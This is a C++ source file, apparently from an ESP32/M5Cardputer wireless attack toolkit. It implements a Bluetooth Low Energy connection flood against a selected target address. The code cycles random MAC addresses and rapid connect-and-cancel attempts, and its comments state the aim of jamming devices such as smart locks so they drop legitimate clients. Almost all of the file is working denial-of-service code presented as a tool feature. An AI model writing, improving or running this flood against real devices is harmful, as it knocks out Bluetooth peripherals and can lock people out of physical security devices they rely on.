/*
 * ble_flood — rapid connection flood against a target MAC.
 *
 * Uses g_ble_target. Spawns a task that cycles:
 *   random MAC -> gap_connect(target) -> cancel on success -> repeat.
 *
 * Defeats many BLE devices that can only hold a small number of
 * connections (smart locks, peripherals) — they get stuck processing
 * our bogus attempts and drop legitimate clients.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "ble_types.h"
#include <NimBLEDevice.h>
#include <esp_random.h>

static volatile bool     s_flood_alive = false;
static volatile uint32_t s_flood_count = 0;
static volatile int      s_flood_last_rc = 0;
static volatile uint32_t s_flood_ok = 0;
static volatile uint32_t s_flood_ticks = 0;

static int flood_cb(ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        if (event->connect.status == 0) {
            ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        }
    }
    return 0;
}

static void set_random_mac(void)
{
    uint8_t mac[6];
    for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)esp_random();
    /* Static-random flag bits live in the MSB (index 5 little-endian),
     * NOT index 0. Setting on byte 0 produced an invalid address that
     * the controller silently rejected — every connect attempt failed
     * with a stale identity. Same bug Sour Apple had. */
    mac[5] |= 0xC0;
    ble_hs_id_set_rnd(mac);
}

/* Cooperative tick. Replaces xTaskCreate(flood_task) which previously
 * toasted "task fail" because NimBLE init left only ~2.5 KB heap — not
 * enough for a 4 KB task stack. Same bug as Sour Apple / Find My /
 * BLE Spam fixed 2026-05-24. */
static bool s_flood_init = false;   /* file-scope: feat entry resets it so each
                                     * session re-reads the current g_ble_target */
static void flood_tick(void)
{
    static ble_addr_t target;
    if (!s_flood_init) {
        s_flood_init = true;
        NimBLEScan *scan = NimBLEDevice::getScan();
        if (scan) scan->stop();
        target.type = g_ble_target.is_public ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
        memcpy(target.val, g_ble_target.addr, 6);
        Serial.printf("[bleflood] cooperative first tick\n");
    }
    s_flood_ticks++;
    ble_gap_conn_cancel();
    set_random_mac();
    int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &target, 200,
                             nullptr, flood_cb, nullptr);
    s_flood_last_rc = rc;
    s_flood_count++;
    if (rc == 0) {
        s_flood_ok++;
        delay(200);
        ble_gap_conn_cancel();
    } else {
        delay(60);
    }
    delay(30);
}

void feat_ble_flood(void)
{
    if (!g_ble_target_valid) {
        ui_toast("scan + select first", T_WARN, 1200);
        return;
    }
    s_flood_init = false;   /* re-read the selected target for this session */
    radio_switch(RADIO_BLE);

    s_flood_count = 0;
    s_flood_ok    = 0;
    s_flood_ticks = 0;
    s_flood_last_rc = 0;
    s_flood_alive = true;

    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_BAD, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("BLE FLOOD");
    d.drawFastHLine(4, BODY_Y + 12, 80, T_BAD);
    d.setTextColor(T_FG, T_BG);
    d.setCursor(4, BODY_Y + 22); d.printf("target %02X:%02X:%02X:%02X:%02X:%02X",
        g_ble_target.addr[0], g_ble_target.addr[1], g_ble_target.addr[2],
        g_ble_target.addr[3], g_ble_target.addr[4], g_ble_target.addr[5]);
    ui_draw_footer("`=stop");

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 200) {
            last = millis();
            d.fillRect(0, BODY_Y + 40, 150, 60, T_BG);
            d.setTextColor(T_GOOD, T_BG);
            d.setCursor(4, BODY_Y + 40);
            d.printf("attempts: %lu", (unsigned long)s_flood_count);
            d.setCursor(4, BODY_Y + 52);
            d.printf("connects: %lu", (unsigned long)s_flood_ok);
            d.setTextColor(s_flood_last_rc == 0 ? T_GOOD : T_WARN, T_BG);
            d.setCursor(4, BODY_Y + 64);
            d.printf("last rc:  %d", s_flood_last_rc);
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 76);
            d.printf("loops:    %lu", (unsigned long)s_flood_ticks);
            ui_draw_status(radio_name(), "flood");
        }
        /* Matrix rain in right gutter + glitch blocks over stats band. */
        ui_matrix_rain(160, BODY_Y + 18, SCR_W - 160, BODY_H - 20, 0xF81F);
        ui_glitch(0, BODY_Y + 40, 150, 40);
        if (s_flood_alive) flood_tick();
        uint16_t k = input_poll();
        if (k == PK_NONE) continue;   /* flood_tick burned ~290 ms */
        if (k == PK_ESC) break;
    }
    s_flood_alive = false;
    /* POS-AUDIT-220 / ble-004: a single ble_gap_conn_cancel races
     * BLE_GAP_EVENT_CONNECT — if the controller delivers a successful
     * conn between our cancel and the function exit, we leak the
     * connection (the peripheral stays joined, exhausts a slot, and
     * the next BLE feature trips conn-table-full). Loop the cancel
     * for up to 500 ms: each iteration cancels in-flight attempts
     * AND races/closes any conn that landed in the last 50 ms gap.
     * s_flood_last_rc tracks the most recent NimBLE return — once
     * it's non-zero AND no new attempt has fired, the controller
     * is idle. */
    {
        uint32_t deadline = millis() + 500;
        do {
            ble_gap_conn_cancel();
            delay(50);
        } while (s_flood_last_rc == 0 && millis() < deadline);
    }
}
